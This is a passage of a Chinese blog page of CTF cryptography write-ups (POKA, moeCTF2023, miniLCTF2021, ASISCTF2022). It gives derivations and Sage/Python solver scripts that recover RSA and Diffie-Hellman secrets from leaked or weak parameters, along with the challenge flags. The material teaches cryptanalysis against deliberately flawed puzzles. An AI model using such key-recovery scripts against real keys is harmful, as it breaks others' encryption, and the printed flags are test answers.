42209220078437574866361422834065152842384701674177020659394975551630638228773791512185847142423481006715264054186715352545791966183624550240806137742117804368809490341638374030752315967)</span><br><span class="line">5283729370502224111594887226837880395316054773227004499787302073503878519636633822827217253857874355522588395812835740811362707153363560194601186826283559964747701769601487977762111123819420098096415036853595000842267748990264765099199777366178415275775930611456486254983609977806288992648707705283164998069127159450643405479857352132413567941113596062821699046442601516070886895831454313645493977658887986960438243972899363731335524071661232212596476620001731293273701784412244890405468701582192239044191141716454262551899911176914268204608240121498434944371667705131307108367792229003968794133948069333063516311066</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>emmm e&#x3D;151<br>dp高位泄露 搜了一圈发现都是从这位<a href="https://github.com/pcw109550/write-up/tree/master/2019/KAPO/Lenstra-Lenstra-Lovasz" target="_blank">佬</a>这里开始的 orz 直接跟着source学习吧<br>记录一下推导过程:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">dp === d % p-1</span><br><span class="line">d == dp+k1*(p-1)</span><br><span class="line">e*d == k2*(p-1)*(q-1)+1</span><br><span class="line">=&gt; e*(dp+k1*(p-1)) == k2*(p-1)*(q-1)+1</span><br><span class="line">mod p-1</span><br><span class="line">=&gt; e*dp === 1 mod p-1</span><br><span class="line">=&gt; e*dp == _k*(p-1)+1</span><br><span class="line">mod p (※)</span><br><span class="line">=&gt; e*dp+k_-1 === 0 mod p</span><br><span class="line">notice that e*dp == _k*(p-1)+1 and dp&lt;p-1</span><br><span class="line">=&gt; _k&lt;e (和dp泄露原理一样!)</span><br><span class="line">so we can enumerate _k from 1 to e</span><br><span class="line">to use coppersmith (for the reason that unknown bits&lt;=410 and beta=1/2, so we can find small roots &lt; N**1/4(512bits))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">(n, secret) = (<span class="number">6455822262099728871488017333002213763928974244728225916053004114762757288446279146632134559883137763509202760259665317867526185880602417384903035043373123172755205541848380033846647830559956562300790213183285570408285813940654388322823643901338114411098146713766948059574036750169834145669828812062836846441826158939413816441792342997972511615875337134161543579227974534136317577528234543157933263750295100350176275449872173516777290564027194224977405688960141636944708509979113636374750606901261856017099651198201404715950047463077544354559113250673461981023710617386807665904679700243253715051955720384474605996461</span>, <span class="number">42209220078437574866361422834065152842384701674177020659394975551630638228773791512185847142423481006715264054186715352545791966183624550240806137742117804368809490341638374030752315967</span>)</span><br><span class="line">ct = <span class="number">5283729370502224111594887226837880395316054773227004499787302073503878519636633822827217253857874355522588395812835740811362707153363560194601186826283559964747701769601487977762111123819420098096415036853595000842267748990264765099199777366178415275775930611456486254983609977806288992648707705283164998069127159450643405479857352132413567941113596062821699046442601516070886895831454313645493977658887986960438243972899363731335524071661232212596476620001731293273701784412244890405468701582192239044191141716454262551899911176914268204608240121498434944371667705131307108367792229003968794133948069333063516311066</span></span><br><span class="line">e = <span class="number">151</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">k</span>):</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    f = e*((secret*<span class="number">2</span>**<span class="number">410</span>)+x)+k-<span class="number">1</span></span><br><span class="line">    f = f.monic()</span><br><span class="line">    roots = f.small_roots(X=<span class="number">2</span>^<span class="number">409</span>,beta=<span class="number">0.4</span>)</span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;dp= <span class="subst">&#123;secret*<span class="number">2</span>**<span class="number">409</span>+roots[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;=================================&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,e):</span><br><span class="line">    attack(k)</span><br><span class="line"><span class="comment"># dp= 111610627483329456042773469243525292052790452506522007088578106283136307535942428003600535113613729808907790947325623821175745420979563394756953617513882387710361103999394612618576932519125987576858649069903834459634170735915011161895680193594023143108156113045675433885394403477072411701711342985242940069663</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后就是简单的dp泄露题目了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,e+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span>((dp*e-<span class="number">1</span>+k)%k==<span class="number">0</span>):</span><br><span class="line">        p = (dp*e-<span class="number">1</span>+k)//k</span><br><span class="line">        q = n//p</span><br><span class="line">        <span class="keyword">if</span>(p*q==n):</span><br><span class="line">            <span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">            <span class="keyword">from</span> primefac <span class="keyword">import</span> *</span><br><span class="line">            d = modinv(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">            <span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(ct,d,n)))</span><br></pre></td></tr></table></figure><p>flag: POKA{You_4r3_Crypt0_N00000B_XDD}</p><p>这位佬真的tql orz</p><h1 id="moeCTF2023"><a href="#moeCTF2023" class="headerlink" title="moeCTF2023"></a>moeCTF2023</h1><h2 id="flag-exchange"><a href="#flag-exchange" class="headerlink" title="flag_exchange"></a>flag_exchange</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> isPrime</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fs:</span><br><span class="line">    flag = fs.read().strip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">diffie_hellman</span>(<span class="params">p, flag</span>):</span><br><span class="line">    alice_privKey = getrandbits(<span class="number">1024</span>)</span><br><span class="line">    alice_pubKey = <span class="built_in">pow</span>(<span class="number">7</span>, alice_privKey, p)</span><br><span class="line">    bob_privKey = getrandbits(<span class="number">1024</span>)</span><br><span class="line">    bob_pubKey = <span class="built_in">pow</span>(<span class="number">7</span>, bob_privKey, p)</span><br><span class="line"></span><br><span class="line">    superkey = <span class="built_in">pow</span>(bob_pubKey, alice_privKey, p)</span><br><span class="line">    m = <span class="built_in">int</span>.from_bytes(flag, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> (m * superkey) % p, alice_pubKey, bob_pubKey</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Callable</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chall</span>(<span class="params"><span class="built_in">input</span>:<span class="type">Callable</span>[[<span class="built_in">str</span>],<span class="literal">None</span>], <span class="built_in">print</span>:<span class="type">Callable</span>[[<span class="built_in">str</span>],<span class="literal">None</span>]</span>):</span><br><span class="line">    p = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;P = &quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> isPrime(p) <span class="keyword">and</span> p.bit_length() &gt;= <span class="number">1024</span>:</span><br><span class="line">        c, alice_pubKey, bob_pubKey = diffie_hellman(p, flag)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Alice&#x27;s public key: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(alice_pubKey))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Bob&#x27;s public key: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(bob_pubKey))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Ciphertext: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(c))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Invalid P&quot;</span>)</span><br></pre></td></tr></table></figure><p>给一个P保证P-1光滑 这样离散对数直接求就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> primefac <span class="keyword">import</span> modinv</span><br><span class="line">p = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(sieve_base)):</span><br><span class="line">    p*=sieve_base[i]</span><br><span class="line">    <span class="keyword">if</span>(p.bit_length()&gt;=<span class="number">1024</span> <span class="keyword">and</span> isPrime(p+<span class="number">1</span>)):</span><br><span class="line">        <span class="built_in">print</span>(p+<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">20404068993016374194542464172774607695659797117423121913227131032339026169175929902244453757410468728842929862271605567818821685490676661985389839958622802465986881376139404138376153096103140834665563646740160279755212317501356863003638612390661668406235422311783742390510526587257026500302696834793248526734305801634165948702506367176701233298064616663553716975429048751575597150417381063934255689124486029492908966644747931</span></span><br><span class="line">A = <span class="number">10535907278790700538391290444921305217259385431263711692801040936511190666531116700305186920599844299554256714210210829717476920248418057857281038962186002736577757264399457937073280966879708966646259512918943865328709139377854814605040022146158670388299143718823490062168338902733222126015956430817934114854967961103604652093740121364332358685392900872098860796503201407589428414466539049626631184008892730055415169100769732</span></span><br><span class="line">B = <span class="number">16348489331356867301630771825154767170233294861057688783357728790213156540287376598857687580984409669161724312800129242584879634810196465793194307910350584763235456209835940884693137265638231235038196296978539087935504760585844080798763164306369527171514584826163061235753126778212519635905807390933273873667058848266096108542464516152013945119362646618506147214283108243842818817447082449655146411335921417161043077611902804</span></span><br><span class="line">c = <span class="number">7632994523412492260557179922189823901916021592995792231423394289817118356542879338257864183368725535825022550174733859623962587355640726058879305520054662785703521463831735133391030853928379496146944314205140328897640874120866187629354584127754485292965951151063241820133235042448633627434068969391854258102614435821987664948230501326316243932358798360818637206571054067460923260493428092446138441830565932807827179355927283</span></span><br><span class="line"><span class="comment"># _A = discrete_log(mod(A,p),mod(7,p))</span></span><br><span class="line"><span class="comment"># _super = pow(B,_A,p)</span></span><br><span class="line"></span><br><span class="line">_<span class="built_in">super</span> = <span class="number">5598697508050553831301016186451810766892175075227457781663609137315994994339946099771767989549360029474161927222425134451542335224836812568338804744981790630968653314082988409623033093913313149007040705162350558420312224001860502897319860524983780294087905883722904658909173858938483002561143035786870483434405455082101246235125472463011482817487767144926351669559368591298053399981071648084262851031724505873554319182541246</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(modinv(_<span class="built_in">super</span>,p)*c%p))</span><br><span class="line"><span class="comment"># moectf&#123;diffie_he11man_key_exChange_is_not_so_hard_2WPIBung92WPIBung9?WP&#125;</span></span><br></pre></td></tr></table></figure><h1 id="miniLCTF2021"><a href="#miniLCTF2021" class="headerlink" title="miniLCTF2021"></a>miniLCTF2021</h1><h2 id="asr"><a href="#asr" class="headerlink" title="asr"></a>asr</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(bytes_to_long(flag) , e , n))</span><br><span class="line">_q = <span class="built_in">int</span>(<span class="built_in">bin</span>(q)[<span class="number">2</span>:][::-<span class="number">1</span>] , <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(p ^ _q)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">142640215238537871365683719891541306935180737226071087966538112975312943506714964164341655541156886519552359173518384366335764339838818638439617545046906731685628758140658162759582216079833807742803333237267119228131836589616600586722503125595590784393805677472708123448256012705645099262323873911736910168311</span></span><br><span class="line"><span class="string">141992115210477059329798383810995602331919683555539663737474122431362785313684902184569357178889736223104558359787247242121836892146092641430333220915928891299001128364434856756544237628623127350186698031711524123158225428351095110283324920060240308834304841350657100420648385312630518518518978998617676378512</span></span><br><span class="line"><span class="string">2687108833541074884027968939992825896836389810177573543799115292760866858835988113613745599976930175463756036625174575759254321939315015594803646458939874</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>这题学到了一种搜索技巧 高低位一起dfs<br>贴个代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> primefac <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>():</span><br><span class="line">    phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    d =modinv(e,phi)</span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(<span class="built_in">pow</span>(c,d,n))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_p_q</span>():</span><br><span class="line">    p_low = [<span class="number">0</span>]</span><br><span class="line">    q_high = [<span class="number">0</span>]</span><br><span class="line">    q_low = [<span class="number">0</span>]</span><br><span class="line">    p_high = [<span class="number">0</span>]</span><br><span class="line">    maskx = <span class="number">1</span></span><br><span class="line">    maskn = <span class="number">2</span></span><br><span class="line">    si = <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        x_lowbits = (x &amp; maskx) &gt;&gt; i</span><br><span class="line">        n_lowbits = (n % maskn)</span><br><span class="line">        tmppp_low = []</span><br><span class="line">        tmpqq_low = []</span><br><span class="line">        tmppp_high =[]</span><br><span class="line">        tmpqq_high =[]</span><br><span class="line">        x_highbits = (x &gt;&gt; (<span class="number">511</span>-i)) &amp; <span class="number">1</span></span><br><span class="line">        n_highbits = (n)&gt;&gt; (<span class="number">1022</span> - <span class="number">2</span>*i)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(p_low)):</span><br><span class="line">            <span class="keyword">for</span> pp_low <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">for</span> qq_low <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                    <span class="keyword">for</span> pp_high <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                        <span class="keyword">for</span> qq_high <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                            <span class="keyword">if</span> pp_low ^ qq_high == x_lowbits <span class="keyword">and</span> qq_low ^ pp_high == x_highbits:</span><br><span class="line">                                temp1 = ((pp_low * maskn //<span class="number">2</span> + p_low[j]) * (qq_low * maskn // <span class="number">2</span> + q_low[j])) % maskn </span><br><span class="line">                                temp2 = (((pp_high &lt;&lt; (<span class="number">511</span>-i)) + p_high[j]) * ((qq_high &lt;&lt; (<span class="number">511</span>-i)) + q_high[j]))&gt;&gt;(<span class="number">1022</span>-<span class="number">2</span>*i)</span><br><span class="line">                                <span class="keyword">if</span> temp1 == n_lowbits :</span><br><span class="line">                                    <span class="keyword">if</span> n_highbits-temp2 &gt;= <span class="number">0</span>  <span class="keyword">and</span> n_highbits-temp2 &lt;=(<span class="number">2</span>&lt;&lt;i+<span class="number">1</span>):</span><br><span class="line">                                        tmppp_low.append(pp_low * maskn //<span class="number">2</span> + p_low[j])</span><br><span class="line">                                        tmpqq_low.append(qq_low * maskn //<span class="number">2</span> + q_low[j])</span><br><span class="line">                                        tmppp_high.append((pp_high&lt;&lt;(<span class="number">511</span>-i))+p_high[j])</span><br><span class="line">                                        tmpqq_high.append((qq_high&lt;&lt;(<span class="number">511</span>-i))+q_high[j])</span><br><span class="line"></span><br><span class="line">        maskn *= <span class="number">2</span></span><br><span class="line">        maskx *= <span class="number">2</span></span><br><span class="line">        p_low = tmppp_low</span><br><span class="line">        q_low = tmpqq_low</span><br><span class="line">        p_high = tmppp_high</span><br><span class="line">        q_high = tmpqq_high</span><br><span class="line">        <span class="built_in">print</span>(i,<span class="built_in">len</span>(p_low))</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> p_low:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> p_high:</span><br><span class="line">            <span class="keyword">if</span> n %(a+b) ==<span class="number">0</span>:</span><br><span class="line">                p = a + b</span><br><span class="line">                <span class="built_in">print</span>(p)</span><br><span class="line">                q = n//p</span><br><span class="line">                <span class="keyword">return</span> p,q</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    n = <span class="number">142640215238537871365683719891541306935180737226071087966538112975312943506714964164341655541156886519552359173518384366335764339838818638439617545046906731685628758140658162759582216079833807742803333237267119228131836589616600586722503125595590784393805677472708123448256012705645099262323873911736910168311</span></span><br><span class="line">    c = <span class="number">141992115210477059329798383810995602331919683555539663737474122431362785313684902184569357178889736223104558359787247242121836892146092641430333220915928891299001128364434856756544237628623127350186698031711524123158225428351095110283324920060240308834304841350657100420648385312630518518518978998617676378512</span></span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    x = <span class="number">2687108833541074884027968939992825896836389810177573543799115292760866858835988113613745599976930175463756036625174575759254321939315015594803646458939874</span> </span><br><span class="line">    p , q = get_p_q()</span><br><span class="line">    flag = get_flag()</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># miniLCTF&#123;reverse_1s_als0_e1sy&#125;</span></span><br></pre></td></tr></table></figure><p>至于为什么要高低位一起dfs 这样的话限制更多 更能充分利用p^reverse(q) 的条件</p><p>这代码确实写的挺棒的 学习了 orz</p><h1 id="ASISCTF2022"><a href="#ASISCTF2022" class="headerlink" title="ASISCTF2022"></a>ASISCTF2022</h1><h2 id="Mindseat"><a href="#Mindseat" class="headerlink" title="Mindseat"></a>Mindseat</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> params, flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">keygen</span>(<span class="params">nbit, k</span>): <span class="comment"># Pubkey function</span></span><br><span class="line">_p = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">p, q = [_p + (getRandomNBitInteger(nbit - k) &lt;&lt; k) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&#x27;01&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> isPrime(p) <span class="keyword">and</span> isPrime(q):</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">s = getRandomRange(<span class="number">2</span>, p * q)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">pow</span>(s, (p - <span class="number">1</span>) // <span class="number">2</span>, p) * <span class="built_in">pow</span>(s, (q - <span class="number">1</span>) // <span class="number">2</span>, q) == (p - <span class="number">1</span>) * (q - <span class="number">1</span>):</span><br><span class="line">pubkey = p * q, s</span><br><span class="line"><span class="keyword">return</span> pubkey</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">pubkey, m</span>):</span><br><span class="line">n, s = pubkey</span><br><span class="line">r = getRandomRange(<span class="number">2</span>, n)</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">pow</span>(s, m, n) * <span class="built_in">pow</span>(r, <span class="number">2</span> ** k, n) % n</span><br><span class="line"></span><br><span class="line">flag = flag.lstrip(<span class="string">b&#x27;ASIS&#123;&#x27;</span>).rstrip(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line">nbit, k = params</span><br><span class="line">PUBKEYS = [keygen(nbit, k) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">flag = [bytes_to_long(flag[i*<span class="number">8</span>:i*<span class="number">8</span> + <span class="number">8</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">ENCS = [encrypt(PUBKEYS[_], flag[_]) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;PUBKEYS = <span class="subst">&#123;PUBKEYS&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;ENCS = <span class="subst">&#123;ENCS&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">PUBKEYS = [(<span class="number">10342840547250370454282840290754052390564265157174829726645242904324433774727630591803186632486959590968595230902808369991240437077297674551123187830095873</span>, <span class="number">5179654005441544601140101875149402241567866059199512232495766031194848985776186595289740052214499657697650832860279375151687044465018028876445070588827777</span>), (<span class="number">6015512135462554031390611730578383462516861987731833360559070749140159284050335604168414434218196369921956160353365713819898567416920672209509202941444097</span>, <span class="number">2116441415129068001049624780654272734931672052541246678702416144768611225693039503554945326959705314527114860312641379671935648337975482830939466425225421</span>), (<span class="number">6396980904648302374999086102690071222661654639262566535518341836426544747072554109709902085144158785649143907600058913175220229111171441332366557866622977</span>, <span class="number">1760317994074087854211747561546045780795134924237097786412713825282874589650448491771874326890983429137451463523250670379970999252639812107914977960011738</span>), (<span class="number">9158217300815233129401608406766983222991414185115152402477702381950519098200234724856258589693986849049556254969769863821366592458050807400542885348638721</span>, <span class="number">6564146847894132872802575925374338252984765675686108816080170162797938388434600448954826704720292576935713424103133182090390089661059813982670332877677256</span>)]</span><br><span class="line">ENCS = [<span class="number">4595268033054096192076432659360373235610019564489694608733743330870893803828258295069937060360520598446948290913045781945314108935153236291467160667601985</span>, <span class="number">3390637292181370684803039833768819598968576813582112632809296088618666221278429695211004046274005776653775480723833818255766663573061866194380012311184611</span>, <span class="number">5197599582013327040903216369733466147938613487439777125659892779696104407398257678982801768761973934713675657188014051286238194316997970299887749668838196</span>, <span class="number">5093835186720390391696398671365109925058893544530286148616117890366909889206952477053316867658405460457795493886317792695055944930027477761411273933822112</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先可以通过n末尾0的个数来确定k 得到k&#x3D;134<br>然后就可以copper分解p,q<br>注意到有 <code>p-1 = p0*2**k</code><br>而且加密是一个dlp问题 所以我们希望利用p-1光滑来求解离散对数<br>将 <code>c===s^m * r^(2**k) mod n</code> 做变形<br>得到  <code>c^p0 === s^(m*p0) * r^(p-1) mod n</code><br>那么我们如果modp的话 就可以把r这一项消掉了<br>解dlp得到 mp0 即可得到m</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">k = <span class="number">134</span></span><br><span class="line"><span class="keyword">for</span> PUBKEY <span class="keyword">in</span> PUBKEYS:</span><br><span class="line">    n = <span class="built_in">int</span>(PUBKEY[<span class="number">0</span>])</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    unk_bits = n.bit_length()//<span class="number">2</span>-k</span><br><span class="line">    f = x*<span class="number">2</span>**k+<span class="number">1</span></span><br><span class="line">    f = f.monic()</span><br><span class="line">    roots = f.small_roots(X=<span class="number">2</span>^(unk_bits+<span class="number">1</span>),beta = <span class="number">0.4</span>)</span><br><span class="line">    <span class="built_in">print</span>(roots)</span><br><span class="line">    <span class="keyword">for</span> root <span class="keyword">in</span> roots:</span><br><span class="line">        p0 = <span class="built_in">int</span>(root)</span><br><span class="line">        p = p0*<span class="number">2</span>**k+<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> is_prime(p):</span><br><span 